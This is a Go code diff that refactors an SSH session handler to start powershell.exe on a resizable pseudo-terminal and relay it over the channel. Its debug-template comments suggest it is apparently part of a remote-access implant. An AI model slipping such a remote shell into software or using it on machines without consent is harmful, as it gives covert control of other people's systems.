@@ -11,26 +11,57 @@ import (
 	"golang.org/x/crypto/ssh"
 )
 
-func handleShell(channel ssh.Channel) {
+type Shell struct {
+	ptyFile pty.Pty
+	width   int
+	height  int
+}
+
+func NewShell() *Shell {
+	return &Shell{
+		ptyFile: nil,
+		width:   80,
+		height:  24,
+	}
+}
+
+func (s *Shell) SetSize(width, height int) {
+	s.width = width
+	s.height = height
+	if s.ptyFile != nil {
+		err := s.ptyFile.Resize(width, height)
+		if err != nil {
+			// {{if .Debug}}
+			log.Printf("Failed to resize pty: %v", err)
+			// {{end}}
+		}
+	}
+}
+
+func (s *Shell) handleShell(channel ssh.Channel) {
 	defer channel.Close()
 
-	ptyFile, err := pty.New()
+	var err error
+	s.ptyFile, err = pty.New()
 	if err != nil {
 		// {{if .Debug}}
 		log.Printf("Failed to create pty: %v", err)
 		// {{end}}
 		return
 	}
-	defer ptyFile.Close()
+	defer s.ptyFile.Close()
 
-	go io.Copy(ptyFile, channel)
-	go io.Copy(channel, ptyFile)
+	s.SetSize(s.width, s.height)
 
-	shell := ptyFile.Command("powershell.exe")
+	go io.Copy(s.ptyFile, channel)
+	go io.Copy(channel, s.ptyFile)
+
+	shell := s.ptyFile.Command("powershell.exe")
 	if err := shell.Start(); err != nil {
 		// {{if .Debug}}
 		log.Printf("Failed to start shell: %v", err)
 		// {{end}}
+		channel.Write([]byte("Failed to start powershell: " + err.Error() + "\n"))
 		return
 	}
 
